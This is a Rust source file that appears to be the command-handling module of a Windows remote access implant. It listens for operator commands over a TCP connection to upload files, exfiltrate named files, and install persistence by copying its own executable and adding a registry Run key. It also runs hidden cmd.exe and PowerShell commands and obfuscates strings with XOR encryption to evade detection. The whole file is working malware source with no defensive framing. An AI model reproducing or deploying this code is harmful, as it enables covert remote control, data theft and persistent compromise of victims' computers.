use tokio::{net::TcpStream, process};
use xorcrypt::{e, prepare_encryption};

use crate::models::{download_file, substr_exists, upload_file, write};

prepare_encryption!();

pub async fn process(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
    if substr_exists(&cmd, e!("::STARTFILE::").as_bytes()).await {
        upload(cmd, conn).await.unwrap();
    } else if substr_exists(&cmd, b"::DOWNLOAD::").await {
        download(cmd, conn).await;
    } else if substr_exists(&cmd, b"::PERSIST::").await {
        persist(cmd, conn).await.unwrap();
    } else {
        return Err(());
    }
    Ok(())
}

async fn persist(cmd: &Vec<u8>, conn: &mut TcpStream) -> Result<(), ()> {
    let command = String::from_utf8(cmd.clone()).unwrap();
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => {
            let path = platform_dirs::AppDirs::new(Some(""), false).unwrap();
            let path = path.cache_dir.join(filename);
            let path = path.to_str().unwrap();
            let data = tokio::fs::read(std::env::current_exe().unwrap())
                .await
                .unwrap();
            tokio::fs::write(path, data).await.unwrap();
            let part1 = e!("reg add HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v")
                .replace("\\\\", "\\");
            let part2 = e!("/t REG_SZ /d");
            let reg_str = format!(
                "{} {} {} \"{}\"",
                part1,
                filename[..filename.len() - 4].to_string(),
                part2,
                path
            );
            println!("{}", reg_str);
            run_cmd(reg_str).await;
            write(conn, b"[+] Persistence done".to_vec()).await.unwrap();
        }
        None => {
            //
        }
    }
    Ok(())
}

async fn upload(cmd: &Vec<u8>, mut conn: &mut TcpStream) -> Result<(), ()> {
    download_file(&cmd).await;
    if write(&mut conn, b"[+] File uploaded successfully".to_vec())
        .await
        .is_err()
    {
        Err(())
    } else {
        Ok(())
    }
}

async fn download(cmd: &Vec<u8>, mut conn: &mut TcpStream) {
    let command = String::from_utf8(cmd.clone()).unwrap();
    let command = command
        .split(" ")
        .map(|x| x.to_string())
        .collect::<Vec<String>>();
    let (_, args) = (&command[0], &command[1..]);
    match args.get(0) {
        Some(filename) => match tokio::fs::read(filename.trim()).await {
            Ok(data) => {
                upload_file(&mut conn, filename, data).await.unwrap();
            }
            Err(_) => {
                write(&mut conn, b"[-] File not found".to_vec())
                    .await
                    .unwrap();
            }
        },
        None => {
            //
        }
    }
}

pub async fn run_cmd(command: String) -> Vec<u8> {
    let mut output = process::Command::new(e!("cmd.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("/C"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    println!("{}", String::from_utf8(output.stdout.clone()).unwrap());
    output.stdout
}
pub async fn run_ps(command: String) -> Vec<u8> {
    let mut output = process::Command::new(e!("powershell.exe"));
    output.creation_flags(0x8000000);
    let mut output = output
        .arg(e!("-NoProfile"))
        .arg(e!("-Command"))
        .arg(command.trim())
        .output()
        .await
        .unwrap();
    output.stdout.append(&mut output.stderr);
    output.stdout
}
